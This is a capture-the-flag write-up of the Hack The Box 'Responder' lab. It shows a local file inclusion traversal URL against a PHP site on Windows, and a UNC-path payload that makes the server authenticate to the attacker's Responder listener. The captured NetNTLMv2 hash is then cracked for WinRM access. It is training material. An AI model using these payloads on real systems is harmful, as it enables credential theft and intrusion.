---
layout: post
title: "HTB: Responder"
subtitle: "PHP LFI on a Windows host, coerce an SMB auth to Responder, crack the NetNTLMv2"
date: 2023-05-29
tags: [htb, windows, lfi, responder, netntlm, starting-point]
category: writeups
kind: machine
tldr: "unika.htb runs PHP on Windows with a page= parameter vulnerable to local file inclusion. LFI on Windows behaves like Linux: traverse to the file you want. Point the include at a UNC path so the server authenticates to your Responder, capture the NetNTLMv2, crack it, and log in over WinRM."
---

## recon

```
80    Apache 2.4.52 (Win64) PHP 8.1.1
5985  WinRM
```

The vhost is `unika.htb`, so add it to hosts.

## LFI

The language switch uses `?page=`, and it includes files with no sanitising:

```
http://unika.htb/index.php?page=../../../../../../../windows/system32/drivers/etc/hosts
```

LFI on a Windows target works the same way it does on Linux, traversal plus the target path. The read of `hosts` confirms it.

## from LFI to a hash

Because the include accepts a path, point it at a UNC share on your box:

```
http://unika.htb/index.php?page=//10.10.x.x/share/anything
```

The server tries to authenticate to that SMB path. Run Responder, catch the NetNTLMv2 for the Administrator (or service) account, crack it offline, and use the recovered password over WinRM for a shell.
